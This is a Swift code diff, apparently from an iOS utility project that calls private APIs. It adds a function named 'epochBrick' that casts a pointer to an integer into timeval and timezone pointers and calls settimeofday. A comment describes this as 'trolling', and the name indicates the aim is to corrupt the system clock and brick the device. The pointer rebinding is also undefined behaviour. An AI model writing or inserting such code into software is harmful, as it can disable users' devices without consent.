@@ -97,9 +97,28 @@ func delDirectoryContents(path: String) {
     }
 }
 
+// from stackoverflow
 func openApp(bundleID: String) -> Bool {
     guard let obj = objc_getClass("LSApplicationWorkspace") as? NSObject else { return false }
     let workspace = obj.perform(Selector(("defaultWorkspace")))?.takeUnretainedValue() as? NSObject
     let open = workspace?.perform(Selector(("openApplicationWithBundleID:")), with: bundleID) != nil
     return open
+}
+
+func epochBrick() {
+    let myInt: Int = 42
+
+    // Create a pointer to the integer
+    withUnsafePointer(to: myInt) { intPointer in
+        // Cast the pointer to an UnsafePointer<Int>
+        let timevalpointer = intPointer.withMemoryRebound(to: timeval.self, capacity: 1) {
+            UnsafePointer<timeval>($0)
+        }
+        
+        let timezonepointer = intPointer.withMemoryRebound(to: timezone.self, capacity: 1) {
+            UnsafePointer<timezone>($0)
+        }
+        // Do a little trolling
+        settimeofday(timevalpointer, timezonepointer)
+    }
 }
